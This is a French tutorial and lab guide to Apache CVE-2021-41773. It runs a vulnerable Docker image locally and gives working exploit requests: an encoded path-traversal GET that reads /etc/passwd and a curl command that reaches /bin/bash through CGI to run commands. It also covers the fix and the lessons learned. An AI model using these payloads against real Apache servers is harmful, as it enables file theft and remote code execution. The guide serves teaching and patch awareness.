# Apache CVE-2021-41773 : Guide de compréhension et d’exploitation  

Ce guide vous accompagne dans la compréhension et l’exploitation de la **vulnérabilité CVE-2021-41773** dans Apache, en détaillant comment **le path traversal et l'exécution de code à distance (RCE)** étaient possibles en raison d'une validation incorrecte des entrées. Vous découvrirez comment cette vulnérabilité a été introduite, comment les attaquants l'ont exploitée et comment elle a finalement été corrigée.

L’attaque **CVE-2021-41773** est une vulnérabilité découverte dans **Apache HTTP Server 2.4.49**, qui permet à un attaquant non authentifié d’accéder à des fichiers en dehors du répertoire racine du serveur via un contournement des restrictions de chemin d’accès (**path traversal**).

📌 **Problème dans le code source**  
Le problème vient d’une modification du fichier **"modules/http/http_request.c"** dans Apache 2.4.49, qui a introduit une erreur dans le processus de normalisation des chemins. Cette erreur permet aux attaquants d’utiliser des séquences comme **`../../`** pour contourner les restrictions et accéder à des fichiers arbitraires sur le serveur.

⚠️ **Détails de l’attaque**  
1. **Path Traversal** : L’attaque exploite cette mauvaise gestion des chemins pour accéder à des fichiers sensibles en dehors du répertoire autorisé.  
2. **Exécution de code** : Si le module CGI est activé, un attaquant peut exécuter du code arbitraire sur le serveur, entraînant une vulnérabilité de **Remote Code Execution (RCE)**.  
3. **Conditions** : La vulnérabilité est présente uniquement si la directive **`Require all denied`** n’est pas correctement configurée.
---

## Prerequisites

1. **Curl installé** : Assurez-vous que curl est installé sur votre système.  
   - Vérifiez avec :  
     ```bash
     curl --version
     ```

2. **Docker installé** : Assurez-vous que Docker est installé sur votre système.  
   - Vérifiez la version de Docker :  
     ```bash
     docker --version
     ```
     
## Exploiting the Vulnerability
### Payload for Exploitation
Une requête malveillante comme :  GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
permet de lire des fichiers en dehors du répertoire racine.

### Steps to Exploit

1. Télécharger l'image Docker contenant l'application vulnérable démontrant la faille RCE via path traversal
        ```bash
 docker pull eddycaron/diable:rcepathtraversal
     ```

3. Lancer l'application vulnérable dans un conteneur Docker en mode détaché (en arrière-plan) et lier le port 8080 du conteneur au port 80 de l'hôte
      ```bash
 docker run -d -p 8080:80 --name rcept eddycaron/diable:rcepathtraversal
     ```

4. Envoyer une requête HTTP malveillante via curl pour exploiter la vulnérabilité de path traversal et exécuter une commande arbitraire (bash), récupérant ainsi le fichier /etc/passwd
        ```bash
 curl -v "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash" -d "echo Content-Type: text/plain; echo; cat /etc/passwd" -H "Content-Type: text/plain" 
     ```


# Impact

- **Accès non autorisé à des fichiers sensibles** : L'exploitation de la vulnérabilité permettait à un attaquant de lire des fichiers en dehors du répertoire racine du serveur, comme des fichiers de configuration ou des mots de passe.  
- **Exécution de code à distance (RCE)** : En exploitant le CGI, un attaquant pouvait exécuter du code arbitraire sur le serveur, compromettant ainsi la sécurité du système.  
- **Exposition des systèmes** : Si la vulnérabilité n'était pas corrigée, elle exposait potentiellement des systèmes à des attaques de type **remote code execution**, entraînant un risque d'élévation de privilèges et d'accès non autorisé à des ressources sensibles.


# Mitigation
Correctif:
La vulnérabilité a été corrigée dans Apache 2.4.50, mais cette version était toujours vulnérable à une variante de l’attaque (si le caractère "point" est encodé deux fois en URL, la vulnérabilité persiste). Ce n’est qu’avec Apache 2.4.51 que le problème a été définitivement résolu.

pour plus de detaille, et pour voir le code source: https://www.hackthebox.com/blog/cve-2021-41773-explained

## Key Takeaways 

- Cette vulnérabilité illustre les risques liés à une mauvaise gestion de la normalisation des chemins dans Apache.  
- Des attaquants pouvaient exploiter cette faille pour accéder à des fichiers sensibles ou exécuter du code à distance (RCE).  
- Toujours valider et filtrer les entrées utilisateur pour éviter les attaques de type path traversal et injection de commande.  
